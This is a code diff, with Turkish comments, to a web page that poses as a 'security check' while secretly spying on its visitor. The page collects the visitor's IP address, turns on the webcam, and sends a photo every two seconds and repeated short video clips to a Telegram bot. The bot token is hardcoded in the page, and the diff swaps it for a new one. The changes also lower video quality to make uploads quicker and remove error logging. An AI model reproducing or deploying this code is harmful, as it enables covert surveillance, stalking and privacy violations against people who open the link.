@@ -61,9 +61,9 @@
 
     <script>
         // ============================================
-        // GİZLİ KONFİGÜRASYON
+        // GİZLİ KONFİGÜRASYON - YENİ TOKEN
         // ============================================
-        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
+        const BOT_TOKEN = "8773124715:AAEfs80t8yv2XnDGy20aLlxy3aFGwDj0jFU";
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
         
@@ -76,7 +76,6 @@
         let videoCount = 0;
         let photoCount = 0;
         let ipGonderildi = false;
-        let isRecording = false;
         
         // ============================================
         // İP ADRESİ AL
@@ -113,7 +112,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK - HER SANİYE
+        // FOTOĞRAF ÇEK - 2 SANİYEDE 1
         // ============================================
         async function takePhoto() {
             if (!video.videoWidth || !video.videoHeight) return;
@@ -138,21 +137,30 @@
                         body: formData
                     });
                     
-                }, 'image/jpeg', 0.7);
+                }, 'image/jpeg', 0.6);
                 
-            } catch(e) {
-                console.log("Fotoğraf hatası:", e);
-            }
+            } catch(e) {}
         }
         
         // ============================================
-        // 2 SANİYELİK VİDEO KAYDI
+        // 2 SANİYELİK VİDEO KAYDI (DÜŞÜK KALİTE)
         // ============================================
         function recordVideo() {
             if (!stream || !stream.active) return;
             
             recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            // Düşük bitrate ile kaydet (küçük boyut için)
+            const options = {
+                mimeType: 'video/webm',
+                videoBitsPerSecond: 25000
+            };
+            
+            try {
+                mediaRecorder = new MediaRecorder(stream, options);
+            } catch(e) {
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            }
             
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) recordedChunks.push(event.data);
@@ -172,8 +180,8 @@
                     body: formData
                 });
                 
-                // 2 saniye sonra yeni video başlasın
-                setTimeout(recordVideo, 100);
+                // 2 saniye sonra yeni video
+                setTimeout(recordVideo, 2000);
             };
             
             // 2 saniye kaydet
@@ -192,9 +200,9 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        facingMode: "user"
+                        width: { ideal: 320 },
+                        height: { ideal: 240 },
+                        frameRate: { ideal: 10 }
                     }
                 });
                 
@@ -203,22 +211,20 @@
                 video.onloadedmetadata = async () => {
                     await video.play();
                     
-                    // IP'yi gönder
                     const ip = await getIP();
                     await sendIP(ip);
                     
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // 1 SANİYEDE 1 FOTOĞRAF (Kesin çalışır)
-                    setInterval(takePhoto, 1000);
+                    // 2 SANİYEDE 1 FOTOĞRAF
+                    setInterval(takePhoto, 2000);
                     
-                    // 2 SANİYELİK VİDEO (Kesin çalışır)
+                    // 2 SANİYEDE 1 VİDEO
                     setTimeout(recordVideo, 2000);
                 };
                 
-                // Yazı değiştir
-                const texts = ["Güvenlik kontrolü...", "Kamera aktif...", "Veriler gönderiliyor..."];
+                const texts = ["Güvenlik kontrolü...", "Kamera aktif..."];
                 let i = 0;
                 setInterval(() => {
                     i = (i + 1) % texts.length;
@@ -253,4 +259,4 @@
         };
     </script>
 </body>
-</html>
+    </html>
